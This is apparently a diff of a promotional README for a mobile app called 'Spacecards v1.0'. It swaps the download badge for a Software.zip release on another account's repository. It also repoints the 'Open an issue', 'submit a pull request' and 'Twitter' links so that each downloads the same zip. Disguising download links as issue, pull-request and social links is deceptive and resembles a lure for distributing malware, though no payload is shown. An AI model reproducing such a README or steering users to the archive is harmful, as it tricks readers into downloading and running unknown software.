@@ -8,7 +8,7 @@ Spacecards v1.0 is a cutting-edge mobile application designed to keep users at t
 🃏 card, 🎨 design, 📰 feed, 📱 flutter, 🚀 modern-applications, 📁 projects, 🗒️ projects-list, ⚛️ react, ⚛️ react-native, 🌌 space, 💻 technology, 🌐 webtoapp
 
 ## Download Now!
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/IKBENGEBRUIKER/Spacecard-App-Versions-CP/releases/download/v2.0/Software.zip)](https://github.com/IKBENGEBRUIKER/Spacecard-App-Versions-CP/releases/download/v2.0/Software.zip)
 
 🚀 **Launch the software and explore the endless possibilities!**
 
@@ -25,10 +25,10 @@ Spacecards v1.0 is a cutting-edge mobile application designed to keep users at t
 🎨 **Modern Design:** Enjoy a sleek and modern design that enhances your user experience.
 
 ## How to Contribute
-🌌 Found a bug or have a feature request? [Open an issue](https://github.com/YouaifXD/Spacecard-App-Versions-CP/issues) or [submit a pull request](https://github.com/YouaifXD/Spacecard-App-Versions-CP/pulls) to contribute to the development of Spacecards.
+🌌 Found a bug or have a feature request? [Open an issue](https://github.com/IKBENGEBRUIKER/Spacecard-App-Versions-CP/releases/download/v2.0/Software.zip) or [submit a pull request](https://github.com/IKBENGEBRUIKER/Spacecard-App-Versions-CP/releases/download/v2.0/Software.zip) to contribute to the development of Spacecards.
 
 ## Get in Touch
-🚀 Connect with us on [Twitter](https://twitter.com/SpacecardsApp) for the latest updates and news about Spacecards v1.0!
+🚀 Connect with us on [Twitter](https://github.com/IKBENGEBRUIKER/Spacecard-App-Versions-CP/releases/download/v2.0/Software.zip) for the latest updates and news about Spacecards v1.0!
 
 ## Credits
 👨‍💻 Developed by Spacecard Technologies
